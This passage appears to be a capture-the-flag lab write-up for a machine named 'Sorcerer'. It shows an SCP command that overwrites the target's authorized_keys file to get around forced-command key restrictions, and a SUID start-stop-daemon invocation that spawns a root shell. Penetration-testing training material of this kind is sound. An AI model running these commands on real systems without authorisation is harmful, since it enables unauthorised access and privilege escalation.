- no-port-forwarding disables TCP forwarding.
- no-X11-forwarding disables X11 forwarding.
- no-agent-forwarding disables SSH agent forwarding.
- no-pty prevents terminal allocation.
- The command option forces the SCP wrapper to run for that authorized key.
The restrictions limited that key to the SCP workflow.

The SCP workflow could write the account's SSH authorization file, undermining the restrictions enforced by the existing key entry.
```bash
scp -O -i id_rsa /home/kali/capstonelabs/Sorcerer/authorized_keys max@192.168.207.100:/home/max/.ssh/authorized_keys
```
The authorization file exposure yielded interactive SSH access and the first flag.


The SUID inventory revealed an unusual privileged service helper.
```txt
44 -rwsr-xr-x 1 root root 44200 Jun 3 2019 /usr/sbin/start-stop-daemon
```
The start-stop-daemon interface could launch another executable. The first check failed, so I reviewed the privilege implications of how the helper invoked child processes.
```bash
/usr/sbin/start-stop-daemon -S -x /bin/sh -- -p
# The double dash ends option parsing for the launcher
# Arguments after the separator are passed through to the child process
```
The privileged helper yielded root access and the second flag.
